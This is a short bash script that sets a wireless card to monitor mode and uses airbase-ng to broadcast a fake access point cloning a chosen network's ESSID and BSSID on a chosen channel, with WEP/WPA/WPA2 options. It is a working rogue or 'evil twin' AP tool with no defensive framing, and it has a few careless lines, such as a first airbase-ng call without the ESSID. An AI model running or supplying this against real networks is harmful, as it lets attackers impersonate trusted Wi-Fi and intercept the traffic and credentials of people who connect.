#!/bin/bash
# anotherik

printf "Enter the essid: "
read essid
printf "Enter the bssid: "
read bssid
printf "Enter the channel: " 
read channel
printf "Enter the interface: "
read iface
printf "setting up monitor mode...\n"
ifconfig $iface down
iwconfig $iface mode monitor
ifconfig $iface up
iw dev $iface set channel $channel

while [ True ]; do
  trap ctrl_c INT
  
  function ctrl_c() {
    printf "\nsetting up managed mode...\n"
    ifconfig $iface down
    iwconfig $iface mode managed
    ifconfig $iface up
    printf "exit..."
    exit 0
  }

  airbase-ng $iface -c $channel
  printf "starting AP...\n"
  airbase-ng -e $essid -a $bssid -W 1 -Z 2 -c $channel $iface # [-W 1 (for wep)/ -W 1 -z 2 (for wpa)/ -W 1 -Z 2 (for wpa2), -Z 2 = TKIP and -Z 4 = CCMP] -c $channel
done

printf "done2"
